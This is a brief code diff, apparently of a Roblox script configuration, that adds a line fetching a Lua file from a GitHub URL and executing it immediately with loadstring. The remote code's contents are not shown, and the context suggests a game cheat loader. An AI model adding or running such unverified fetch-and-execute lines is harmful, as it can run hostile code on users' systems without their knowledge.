@@ -2,7 +2,7 @@ getgenv().Config = {
     Invite = "karved.trident",
     Version = "1.0",
 }
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SemaP1rat/sanya.pub/main/hbbodylegit.lua", true))()
 getgenv().luaguardvars = {
     DiscordName = "rvd1",
 }
